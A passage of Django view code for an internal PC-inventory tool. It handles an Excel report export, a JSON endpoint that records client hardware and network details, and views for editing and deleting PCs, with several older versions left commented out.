#     max_length = 0
#     for cell in ws[column_letter]:
#         if cell.value:
#             max_length = max(max_length, len(str(cell.value)))
#     ws.column_dimensions[column_letter].width = max_length * 1.2

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers (center) and "Created by" (right) visible only when printing
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"
#     ws.oddFooter.right.text = f"Created by: {username}"
#     ws.oddFooter.right.size = 10
#     ws.oddFooter.right.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response





from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
from openpyxl.utils import get_column_letter
from openpyxl.worksheet.page import PrintPageSetup
from django.http import HttpResponse
import pandas as pd
from openpyxl import Workbook
import io
from datetime import datetime

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         # Parse and reformat storage with SSD, HDD, Unknown order
#         storage_parts = system.storage.split(",")
#         ssd_storage = []
#         hdd_storage = []
#         unknown_storage = []

#         for part in storage_parts:
#             part = part.strip()
#             if "SSD" in part:
#                 size = part.split(":")[1].strip().split()[0]  # Extract "238GB"
#                 ssd_storage.append(f"SSD({size})")
#             elif "Unknown" in part:
#                 size = part.split(":")[1].strip().split()[0]  # Extract "932GB"
#                 unknown_storage.append(f"Unknown({size})")
#             else:  # Assume anything else is HDD
#                 size = part.split(":")[1].strip().split()[0] if ":" in part else "Unknown"
#                 hdd_storage.append(f"HDD({size})")

#         # Combine in the desired order: SSD, HDD, Unknown
#         formatted_storage = ssd_storage + hdd_storage + unknown_storage
#         storage_str = ",".join(formatted_storage) if formatted_storage else "None"

#         # Prepare the graphics string separately to handle newlines
#         label_width = 9  # Length of "Processor", the longest label
#         graphics_formatted = system.graphics_card.replace(' + ', '\n' + ' ' * (label_width + 3))

#         # # Updated description with consistent alignment
#         # description = (
#         #     f"{'Processor':<{label_width}} : {system.processor},\n"
#         #     f"{'RAM':<{label_width}} : {system.ram_gb} GB,\n"
#         #     f"{'RAM'     :}    : {system.ram_gb} GB,\n"
#         #     f"{'Storage':<{label_width}} : {storage_str},\n"
#         #     f"{'Graphics':<{label_width}} : {graphics_formatted},\n"
#         #     f"{'Monitor':<{label_width}} : {monitor_models}"
#         # )


#         # Updated description with consistent alignment
#         description = (
#             f"{'Processor':}   {system.processor},\n"
#             # f"{'RAM':}      {system.ram_gb} GB,\n"
#             f"{'RAM':}      {system.ram_gb} GB,\n"
#             f"{'Storage':}     {storage_str},\n"
#             f"{'Graphics':}    {graphics_formatted},\n"
#             f"{'Monitor':}     {monitor_models}"
#         )


#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information with enhanced styling, removing company name
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = "PC Details Report"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the report header
#     header_font = Font(size=15, bold=True, color="FFFFFF")
#     header_fill_1 = PatternFill(start_color="1F4E79", end_color="1F4E79", fill_type="solid")  # Dark blue
#     header_fill_2 = PatternFill(start_color="4CAF50", end_color="4CAF50", fill_type="solid")  # Green
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill_1
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill_2
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Increase row height for report header rows
#     ws.row_dimensions[1].height = 25
#     ws.row_dimensions[2].height = 25

#     # Write DataFrame to sheet
#     start_row = 4
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top", horizontal="left")
#                 cell.font = Font(size=9)  # Set font size to 9 for Description column

#     # Apply colorful table styling
#     thick_border = Border(left=Side(style='medium', color="000000"),
#                           right=Side(style='medium', color="000000"),
#                           top=Side(style='medium', color="000000"),
#                           bottom=Side(style='medium', color="000000"))
#     thin_border = Border(left=Side(style='thin', color="000000"),
#                          right=Side(style='thin', color="000000"),
#                          top=Side(style='thin', color="000000"),
#                          bottom=Side(style='thin', color="000000"))
#     table_font = Font(size=14, bold=True, color="FFFFFF")
#     even_row_fill = PatternFill(start_color="E3F2FD", end_color="E3F2FD", fill_type="solid")
#     odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")

#     # Style the table header with individual colors
#     header_colors = [
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Deep Orange
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Indigo
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid"),  # Teal
#         PatternFill(start_color="FF5722", end_color="3F51B5", fill_type="solid")   # Amber
#     ]

#     for idx, cell in enumerate(ws[start_row]):
#         cell.fill = header_colors[idx]
#         cell.font = table_font
#         cell.border = thick_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")
#     ws.row_dimensions[start_row].height = 50

#     # Style the data rows with alternating colors and dynamic row height
#     for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
#         fill = even_row_fill if idx % 2 == 0 else odd_row_fill
#         for cell in row:
#             cell.border = thin_border
#             cell.fill = fill
#             if cell.column_letter == 'D':  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top", horizontal="left")
#                 cell.font = Font(size=9)  # Ensure font size 9
#                 # Calculate row height based on number of lines in Description
#                 num_lines = str(cell.value).count('\n') + 1  # +1 for the first line
#                 row_height = num_lines * 15  # 15 points per line (adjustable)
#                 ws.row_dimensions[cell.row].height = max(row_height, 20)  # Minimum height of 20
#             else:
#                 cell.alignment = Alignment(horizontal="left", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 15
#     ws.column_dimensions['B'].width = 15
#     ws.column_dimensions['C'].width = 30

#     # Set column width based on the longest content in column D
#     column_letter = 'D'
#     max_length = 0
#     for cell in ws[column_letter]:
#         if cell.value:
#             max_length = max(max_length, len(str(cell.value)))
#     ws.column_dimensions[column_letter].width = max_length * 1.2

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with page numbers (center) and "Created by" (right) visible only when printing
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"
#     ws.oddFooter.right.text = f"Created by: {username}"
#     ws.oddFooter.right.size = 10
#     ws.oddFooter.right.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response







from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
from openpyxl.utils import get_column_letter
from openpyxl.worksheet.page import PrintPageSetup
from django.http import HttpResponse
import pandas as pd
from openpyxl import Workbook
import io
from datetime import datetime

def download_pc_details_excel(request):
    # Get the current username
    username = request.user.username if request.user.is_authenticated else "Anonymous"

    # Query all SystemInfo records
    system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

    # Prepare data
    data = []
    for system in system_info_qs:
        computer_name_parts = system.computer_name.split("-")
        if len(computer_name_parts) > 1:
            site_name = computer_name_parts[0].strip()
            staff_name = computer_name_parts[-1].strip()
        else:
            site_name = "None"
            staff_name = computer_name_parts[0].strip()

        monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
        if not monitor_models:
            monitor_models = "None"

        # Parse and reformat storage with SSD, HDD, Unknown order
        storage_parts = system.storage.split(",")
        ssd_storage = []
        hdd_storage = []
        unknown_storage = []

        for part in storage_parts:
            part = part.strip()
            if "SSD" in part:
                size = part.split(":")[1].strip().split()[0]  # Extract "238GB"
                ssd_storage.append(f"SSD({size})")
            elif "Unknown" in part:
                size = part.split(":")[1].strip().split()[0]  # Extract "932GB"
                unknown_storage.append(f"Unknown({size})")
            else:  # Assume anything else is HDD
                size = part.split(":")[1].strip().split()[0] if ":" in part else "Unknown"
                hdd_storage.append(f"HDD({size})")

        # Combine in the desired order: SSD, HDD, Unknown
        formatted_storage = ssd_storage + hdd_storage + unknown_storage
        storage_str = ",".join(formatted_storage) if formatted_storage else "None"

        # Prepare the graphics string separately to handle newlines
        label_width = 9  # Length of "Processor", the longest label
        # graphics_formatted = system.graphics_card.replace(' + ', '\n' + ' ' * (label_width + 3))
        graphics_formatted = system.graphics_card.replace(' + ', '\n' + ' ' * (label_width + 13))

        # Updated description with consistent alignment
        description = (
            f"{'Processor':}  {system.processor},\n"
            # f"{'RAM':}          {system.ram_gb} GB,\n"
            f"{'RAM':}           {system.ram_gb} GB,\n"
            f"{'Storage':}     {storage_str},\n"
            f"{'Graphics':}   {graphics_formatted},\n"
            f"{'Monitor':}     {monitor_models}"
        )
        data.append({
            'SiteName': site_name,
            'Staff Name': staff_name,
            'model': system.model,
            'Description': description
        })

    # Create a DataFrame
    df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

    # Create a new workbook and worksheet
    wb = Workbook()
    ws = wb.active
    ws.title = "PC Details Report"

    # Add header information with professional styling
    current_date = datetime.now().strftime("%Y-%m-%d")
    ws.cell(row=1, column=1).value = "PC Details Report"
    ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

    # Merge cells for the header
    ws.merge_cells('A1:D1')
    ws.merge_cells('A2:D2')

    # Style the report header
    header_font = Font(name="Calibri", size=14, bold=True, color="FFFFFF")
    header_fill = PatternFill(start_color="2E4053", end_color="2E4053", fill_type="solid")  # Dark slate gray
    subheader_fill = PatternFill(start_color="5D6D7E", end_color="5D6D7E", fill_type="solid")  # Lighter gray

    ws['A1'].font = header_font
    ws['A1'].fill = header_fill
    ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
    ws['A2'].font = Font(name="Calibri", size=11, color="FFFFFF")
    ws['A2'].fill = subheader_fill
    ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

    # Set row heights for header
    ws.row_dimensions[1].height = 30
    ws.row_dimensions[2].height = 20

    # Write DataFrame to sheet
    start_row = 4
    for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
        for c_idx, value in enumerate(row, 1):
            cell = ws.cell(row=r_idx, column=c_idx, value=value)
            if c_idx == 4:  # Description column
                cell.alignment = Alignment(wrap_text=True, vertical="top", horizontal="left")
                cell.font = Font(name="Calibri", size=9)  # Set font size to 9 for Description column

    # Define professional table styling
    thick_border = Border(left=Side(style='medium', color="4A4A4A"),
                          right=Side(style='medium', color="4A4A4A"),
                          top=Side(style='medium', color="4A4A4A"),
                          bottom=Side(style='medium', color="4A4A4A"))
    thin_border = Border(left=Side(style='thin', color="D3D3D3"),
                         right=Side(style='thin', color="D3D3D3"),
                         top=Side(style='thin', color="D3D3D3"),
                         bottom=Side(style='thin', color="D3D3D3"))
    table_header_font = Font(name="Calibri", size=11, bold=True, color="FFFFFF")
    table_body_font = Font(name="Calibri", size=10)
    even_row_fill = PatternFill(start_color="F2F2F2", end_color="F2F2F2", fill_type="solid")  # Light gray
    odd_row_fill = PatternFill(start_color="FFFFFF", end_color="FFFFFF", fill_type="solid")  # White

    # Style the table header
    header_fill = PatternFill(start_color="34495E", end_color="34495E", fill_type="solid")  # Dark blue-gray
    for idx, cell in enumerate(ws[start_row]):
        cell.fill = header_fill
        cell.font = table_header_font
        cell.border = thick_border
        cell.alignment = Alignment(horizontal="center", vertical="center")
    ws.row_dimensions[start_row].height = 30

    # Style the data rows with alternating colors and dynamic row height
    for idx, row in enumerate(ws[start_row+1:start_row+len(df)+1], start=1):
        fill = even_row_fill if idx % 2 == 0 else odd_row_fill
        for cell in row:
            cell.border = thin_border
            cell.fill = fill
            cell.font = table_body_font
            if cell.column_letter == 'D':  # Description column
                cell.alignment = Alignment(wrap_text=True, vertical="top", horizontal="left")
                cell.font = Font(name="Calibri", size=9)  # Ensure font size 9 for Description
                # Calculate row height based on number of lines in Description
                num_lines = str(cell.value).count('\n') + 1  # +1 for the first line
                row_height = max(num_lines * 12, 20)  # 12 points per line for font size 9, minimum 20
                ws.row_dimensions[cell.row].height = row_height
            else:
                cell.alignment = Alignment(horizontal="left", vertical="center")

    # Adjust column widths for better readability
    ws.column_dimensions['A'].width = 15  # SiteName
    ws.column_dimensions['B'].width = 20  # Staff Name
    ws.column_dimensions['C'].width = 25  # Model
    ws.column_dimensions['D'].width = 50  # Description (increased for wrapped text)

    # Add filters
    ws.auto_filter.ref = f"A{start_row}:D{start_row}"

    # Freeze the header row
    ws.freeze_panes = ws[f'A{start_row+1}']

    # Set print options for A4 landscape
    ws.page_setup = PrintPageSetup(
        paperSize=9,
        orientation='landscape',
        fitToWidth=1,
        fitToHeight=0
    )

    # Add footer with page numbers (center) and "Created by" (right) visible only when printing
    ws.oddFooter.center.text = "Page &[Page] of &[Pages]"
    ws.oddFooter.center.size = 10
    ws.oddFooter.center.font = "Calibri"
    ws.oddFooter.right.text = f"Created by: {username}"
    ws.oddFooter.right.size = 10
    ws.oddFooter.right.font = "Calibri"

    # Save to a BytesIO buffer
    buffer = io.BytesIO()
    wb.save(buffer)
    buffer.seek(0)

    # Create the HTTP response
    response = HttpResponse(
        buffer.getvalue(),
        content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    )
    response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

    return response












# Function to process computer names
def process_site_name(name):
    if "-" in name:
        # Split the name at "-"
        parts = name.split("-")
        site_name = parts[0].strip()
        comp_name = parts[1].strip()
        return site_name
    else:
        # If no "-", entire text is the computer name
        return "(No site name specified)"


# Function to process computer names
def process_site_name(name):
    if "-" in name:
        # Split the name at "-"
        parts = name.split("-")
        site_name = parts[0]
        comp_name = parts[1]
        return site_name
    else:
        # If no "-", entire text is the computer name
        return f"(No site name specified)"


# @csrf_exempt
# def system_info(request):
#     if request.method == 'POST':
#         try:
#             data = json.loads(request.body)
#             timestamp = data.get('timestamp')
#             user_info = data.get('user_info', {})
#             username = user_info.get('username', '')
#             computer_name = user_info.get('computer_name', '')
#             anydesk_id = user_info.get('anydesk_id', '')
#             ip_addresses = user_info.get('ip_addresses', {})
#             ipv4 = ip_addresses.get('ipv4', '')
#             ipv6 = ip_addresses.get('ipv6', '')

#             hardware = data.get('hardware', {})
#             bios_serial = hardware.get('bios_serial', '')
#             model = hardware.get('model', '')
#             processor = hardware.get('processor', '')
#             ram_gb = float(hardware.get('ram_gb', 0))
#             graphics_card = hardware.get('graphics_card', '')
#             storage = hardware.get('storage', '')
#             monitors_data = hardware.get('monitors', {})
#             display_settings_data = hardware.get('display_settings', [])

#             operating_system = data.get('operating_system', {})
#             os_name = operating_system.get('name', '')
#             os_version = operating_system.get('version', '')
#             os_manufacturer = operating_system.get('manufacturer', '')

#             timestamp_dt = timezone.datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
#             try:
#                 system_info = SystemInfo.objects.get(bios_serial=bios_serial)
#                 system_info.timestamp = timestamp_dt
#                 system_info.username = username
#                 system_info.computer_name = computer_name
#                 system_info.anydesk_id = anydesk_id
#                 system_info.ipv4 = ipv4
#                 system_info.ipv6 = ipv6
#                 system_info.model = model
#                 system_info.processor = processor
#                 system_info.ram_gb = ram_gb
#                 system_info.graphics_card = graphics_card
#                 system_info.storage = storage
#                 system_info.os_name = os_name
#                 system_info.os_version = os_version
#                 system_info.os_manufacturer = os_manufacturer
#                 system_info.save()
#                 system_info.monitors.all().delete()
#                 system_info.display_settings.all().delete()
#                 action = 'updated'
#                 status_code = 200
#             except SystemInfo.DoesNotExist:
#                 system_info = SystemInfo(
#                     timestamp=timestamp_dt,
#                     username=username,
#                     computer_name=computer_name,
#                     anydesk_id=anydesk_id,
#                     ipv4=ipv4,
#                     ipv6=ipv6,
#                     bios_serial=bios_serial,
#                     model=model,
#                     processor=processor,
#                     ram_gb=ram_gb,
#                     graphics_card=graphics_card,
#                     storage=storage,
#                     os_name=os_name,
#                     os_version=os_version,
#                     os_manufacturer=os_manufacturer
#                 )
#                 system_info.save()
#                 action = 'created'
#                 status_code = 201

#             for monitor in monitors_data.get('Monitors', []):
#                 Monitor.objects.create(
#                     system_info=system_info,
#                     monitor_model=monitor.get('Monitor Model', ''),
#                     serial_number=monitor.get('Serial Number', '')
#                 )

#             for display in display_settings_data:
#                 DisplaySetting.objects.create(
#                     system_info=system_info,
#                     resolution=display.get('Resolution', ''),
#                     refresh_rate=display.get('RefreshRate', ''),
#                     adapter_name=display.get('AdapterName', '')
#                 )

#             response_data = {
#                 'status': 'success',
#                 'message': f'System information {action} successfully',
#                 'timestamp': timestamp,
#                 'username': username,
#                 'computer_name': computer_name,
#                 'anydesk_id': anydesk_id,
#                 'bios_serial': bios_serial
#             }
#             return JsonResponse(response_data, status=status_code)
#         except json.JSONDecodeError:
#             return JsonResponse({'status': 'error', 'message': 'Invalid JSON data'}, status=400)
#         except ValueError as ve:
#             return JsonResponse({'status': 'error', 'message': f'Value error: {str(ve)}'}, status=400)
#         except Exception as e:
#             return JsonResponse({'status': 'error', 'message': f'An error occurred: {str(e)}'}, status=500)
#     else:
#         return JsonResponse({'status': 'error', 'message': 'Only POST requests are allowed'}, status=405)

# def pc_details(request):
#     systems = SystemInfo.objects.all().prefetch_related('monitors', 'display_settings')
#     return render(request, 'pc_details.html', {'systems': systems})

# def pc_detail(request, pk):
#     system = get_object_or_404(SystemInfo, pk=pk)
#     if request.method == 'POST' and 'delete' in request.POST:
#         # Delete the system and its related objects
#         system.delete()
#         return HttpResponseRedirect(reverse('pc_details'))  # Redirect to list page after deletion
#     return render(request, 'pc_detail.html', {'system': system})

# from django.shortcuts import render, get_object_or_404, redirect
# from django.http import JsonResponse, HttpResponseRedirect
# from django.urls import reverse
# from django.views.decorators.csrf import csrf_exempt
# from django.contrib import messages
# from django.utils import timezone
# import json
# from .models import SystemInfo, Monitor, DisplaySetting

@csrf_exempt
def system_info(request):
    # Unchanged except for adding additional_hardware initialization
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            timestamp = data.get('timestamp')
            remark= data.get('remarks')
            user_info = data.get('user_info', {})
            username = user_info.get('username', '')
            computer_name = user_info.get('computer_name', '')
            anydesk_id = user_info.get('anydesk_id', '')
            ip_addresses = user_info.get('ip_addresses', {})
            ipv4 = ip_addresses.get('ipv4', '')
            ipv6 = ip_addresses.get('ipv6', '')

            hardware = data.get('hardware', {})
            bios_serial = hardware.get('bios_serial', '')
            model = hardware.get('model', '')
            processor = hardware.get('processor', '')
            ram_gb = float(hardware.get('ram_gb', 0))
            graphics_card = hardware.get('graphics_card', '')
            storage = hardware.get('storage', '')
            monitors_data = hardware.get('monitors', {})
            display_settings_data = hardware.get('display_settings', [])

            operating_system = data.get('operating_system', {})
            os_name = operating_system.get('name', '')
            os_version = operating_system.get('version', '')
            os_manufacturer = operating_system.get('manufacturer', '')


            timestamp_dt = timezone.datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
            try:
                system_info = SystemInfo.objects.get(bios_serial=bios_serial)
                system_info.timestamp = timestamp_dt
                system_info.remarks = remark
                system_info.username = username
                system_info.computer_name = computer_name
                system_info.sitename = process_site_name(computer_name)
                system_info.anydesk_id = anydesk_id
                system_info.ipv4 = ipv4
                system_info.ipv6 = ipv6
                system_info.model = model
                system_info.processor = processor
                system_info.ram_gb = ram_gb
                system_info.graphics_card = graphics_card
                system_info.storage = storage
                system_info.os_name = os_name
                system_info.os_version = os_version
                system_info.os_manufacturer = os_manufacturer
                system_info.save()
                system_info.monitors.all().delete()
                system_info.display_settings.all().delete()
                action = 'updated'
                status_code = 200
            except SystemInfo.DoesNotExist:
                system_info = SystemInfo(
                    timestamp=timestamp_dt,
                    remarks = remark,
                    username=username,
                    computer_name=computer_name,
                    sitename = process_site_name(computer_name),
                    anydesk_id=anydesk_id,
                    ipv4=ipv4,
                    ipv6=ipv6,
                    bios_serial=bios_serial,
                    model=model,
                    processor=processor,
                    ram_gb=ram_gb,
                    graphics_card=graphics_card,
                    storage=storage,
                    os_name=os_name,
                    os_version=os_version,
                    os_manufacturer=os_manufacturer,
                    additional_hardware=[]  # Still initializes as an empty list
                )
                system_info.save()
                action = 'created'
                status_code = 201

            for monitor in monitors_data.get('Monitors', []):
                Monitor.objects.create(
                    system_info=system_info,
                    monitor_model=monitor.get('Monitor Model', ''),
                    serial_number=monitor.get('Serial Number', '')
                )

            for display in display_settings_data:
                DisplaySetting.objects.create(
                    system_info=system_info,
                    resolution=display.get('Resolution', ''),
                    refresh_rate=display.get('RefreshRate', ''),
                    adapter_name=display.get('AdapterName', '')
                )

            response_data = {
                'status': 'success',
                'message': f'System information {action} successfully',
                'timestamp': timestamp,
                'remarks' : remark,
                'username': username,
                'computer_name': computer_name,
                'anydesk_id': anydesk_id,
                'bios_serial': bios_serial
            }
            return JsonResponse(response_data, status=status_code)
        except json.JSONDecodeError:
            return JsonResponse({'status': 'error', 'message': 'Invalid JSON data'}, status=400)
        except ValueError as ve:
            return JsonResponse({'status': 'error', 'message': f'Value error: {str(ve)}'}, status=400)
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': f'An error occurred: {str(e)}'}, status=500)
    else:
        return JsonResponse({'status': 'error', 'message': 'Only POST requests are allowed'}, status=405)

from .models import SystemInfo, Menu  # Assuming SystemInfo is your model
 # Import get_menu_context if it's in views.py

def pc_details(request):
    systems = SystemInfo.objects.all().prefetch_related('monitors', 'display_settings')
    menus = Menu.objects.filter(parent__isnull=True)
    context = get_menu_context(request)
    context.update({
        'systems': systems,
        'menus': menus
    })
    return render(request, 'it/pc_details.html', context)

# def pc_detail(request, pk):
#     system = get_object_or_404(SystemInfo, pk=pk)

#     if request.method == 'POST':
#         if 'delete' in request.POST:
#             system.delete()
#             messages.success(request, f"PC {system.computer_name} deleted successfully.")
#             return HttpResponseRedirect(reverse('pc_details'))
#         elif 'add_hardware' in request.POST:
#             new_hardware = request.POST.get('new_hardware', '').strip()
#             if new_hardware:
#                 if not system.additional_hardware:
#                     system.additional_hardware = []
#                 # Add item with date and logged-in user
#                 system.additional_hardware.append({
#                     'name': new_hardware,
#                     'date': timezone.now().strftime('%Y-%m-%d'),
#                     'user': request.user.username if request.user.is_authenticated else 'Anonymous'
#                 })
#                 system.save()
#                 messages.success(request, f"Added {new_hardware} to {system.computer_name}.")
#             return redirect('pc_detail', pk=pk)
#         elif 'update' in request.POST:
#             try:
#                 system.timestamp = timezone.datetime.strptime(
#                     request.POST.get('timestamp', str(system.timestamp)), '%Y-%m-%d %H:%M:%S'
#                 )
#                 system.username = request.POST.get('username', system.username)
#                 system.computer_name = request.POST.get('computer_name', system.computer_name)
#                 system.anydesk_id = request.POST.get('anydesk_id', system.anydesk_id)
#                 system.ipv4 = request.POST.get('ipv4', system.ipv4)
#                 system.ipv6 = request.POST.get('ipv6', system.ipv6)
#                 system.bios_serial = request.POST.get('bios_serial', system.bios_serial)
#                 system.model = request.POST.get('model', system.model)
#                 system.processor = request.POST.get('processor', system.processor)
#                 system.ram_gb = float(request.POST.get('ram_gb', system.ram_gb or 0))
#                 system.graphics_card = request.POST.get('graphics_card', system.graphics_card)
#                 system.storage = request.POST.get('storage', system.storage)
#                 system.os_name = request.POST.get('os_name', system.os_name)
#                 system.os_version = request.POST.get('os_version', system.os_version)
#                 system.os_manufacturer = request.POST.get('os_manufacturer', system.os_manufacturer)
#                 system.save()
#                 messages.success(request, f"PC {system.computer_name} updated successfully.")
#             except ValueError as ve:
#                 messages.error(request, f"Error updating PC: {str(ve)}")
#             return redirect('pc_detail', pk=pk)

#     return render(request, 'pc_detail.html', {'system': system})


def pc_detail(request, pk):
    system = get_object_or_404(SystemInfo, pk=pk)
    history_records = HistoryPC.objects.filter(bios_serial=system.bios_serial).order_by('changed_at')
    # Get the latest system info record
    latest_record = SystemInfo.objects.filter(bios_serial=system.bios_serial).latest('timestamp')
    # Prepare history data in the format expected by template
    name_change_history = []
    name_change_history = [
        {
            'old_name': record.old_computer_name,
            'new_name': record.new_computer_name,
            'user': record.username,
            'date': record.changed_at
        }
        for record in history_records
    ]



    if request.method == 'POST':
        if 'delete' in request.POST:
            system.delete()
            messages.success(request, f"PC {system.computer_name} deleted successfully.")
            return HttpResponseRedirect(reverse('pc_details'))
        elif 'add_hardware' in request.POST:
            # Check dropdown first, then custom input if "Other" is selected
            new_hardware = request.POST.get('new_hardware', '').strip()
            custom_hardware = request.POST.get('custom_hardware', '').strip()
            if new_hardware == 'Other' and custom_hardware:
                hardware_value = custom_hardware
            elif new_hardware and new_hardware != 'Other' and new_hardware != '':
                hardware_value = new_hardware
            else:
                messages.error(request, "Please select an item or specify a custom one.")
                return redirect('pc_detail', pk=pk)

            if not system.additional_hardware:
                system.additional_hardware = []
            system.additional_hardware.append({
                'name': hardware_value,
                'date': timezone.now().strftime('%Y-%m-%d'),
                'user': request.user.username if request.user.is_authenticated else 'Anonymous'
            })
            system.save()
            messages.success(request, f"Added {hardware_value} to {system.computer_name}.")
            return redirect('pc_detail', pk=pk)
        elif 'update' in request.POST:
            try:
                system.timestamp = timezone.datetime.strptime(
                    request.POST.get('timestamp', str(system.timestamp)), '%Y-%m-%d %H:%M:%S'
                )
                system.username = request.POST.get('username', system.username)
                system.computer_name = request.POST.get('computer_name', system.computer_name)
                system.sitename = process_site_name(system.computer_name)
                system.anydesk_id = request.POST.get('anydesk_id', system.anydesk_id)
                system.ipv4 = request.POST.get('ipv4', system.ipv4)
                system.ipv6 = request.POST.get('ipv6', system.ipv6)
                system.bios_serial = request.POST.get('bios_serial', system.bios_serial)
                system.model = request.POST.get('model', system.model)
                system.processor = request.POST.get('processor', system.processor)
                system.ram_gb = float(request.POST.get('ram_gb', system.ram_gb or 0))
                system.graphics_card = request.POST.get('graphics_card', system.graphics_card)
                system.storage = request.POST.get('storage', system.storage)
                system.os_name = request.POST.get('os_name', system.os_name)
                system.os_version = request.POST.get('os_version', system.os_version)
                system.os_manufacturer = request.POST.get('os_manufacturer', system.os_manufacturer)
                system.save()
                messages.success(request, f"PC {system.computer_name} updated successfully.")
            except ValueError as ve:
                messages.error(request, f"Error updating PC: {str(ve)}")
            return redirect('pc_detail', pk=pk)

    # return render(request, 'pc_detail.html', {'system': system},{'history_records': history_records},{'latest_record': latest_record})

    menus = Menu.objects.filter(parent__isnull=True)
    context = get_menu_context(request)
    context.update({
        # 'systems': systems,
        'menus': menus,
        'system': system,
        'name_change_history': name_change_history
    })
    return render(request, 'it/pc_detail.html', context)


def edit_hardware(request, pk, index):
    system = get_object_or_404(SystemInfo, pk=pk)
    if index >= len(system.additional_hardware):
        messages.error(request, "Invalid hardware item index.")
        return redirect('pc_detail', pk=pk)

    if request.method == 'POST':
        new_value = request.POST.get('hardware_value', '').strip()
        if new_value:
            # Update only the 'name', preserve date and user
            system.additional_hardware[index]['name'] = new_value
            system.save()
            messages.success(request, f"Updated hardware item to {new_value}.")
        return redirect('pc_detail', pk=pk)

    return render(request, 'it/edit_hardware.html', {
        'system': system,
        'index': index,
        'current_value': system.additional_hardware[index]['name']
    })

def delete_hardware(request, pk, index):
    system = get_object_or_404(SystemInfo, pk=pk)
    if request.method == 'POST':
        if index < len(system.additional_hardware):
            deleted_item = system.additional_hardware.pop(index)
            system.save()
            messages.success(request, f"Deleted hardware item: {deleted_item['name']}.")
        else:
            messages.error(request, "Invalid hardware item index.")
        return redirect('pc_detail', pk=pk)
    return redirect('pc_detail', pk=pk)


#TARGET_MESSAGE = "Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted): 2025-02-22 05:01:57\nCurrent User's Login: mukhilpw\n"

@csrf_exempt
@require_http_methods(["GET", "POST"])
def message_handler(request):
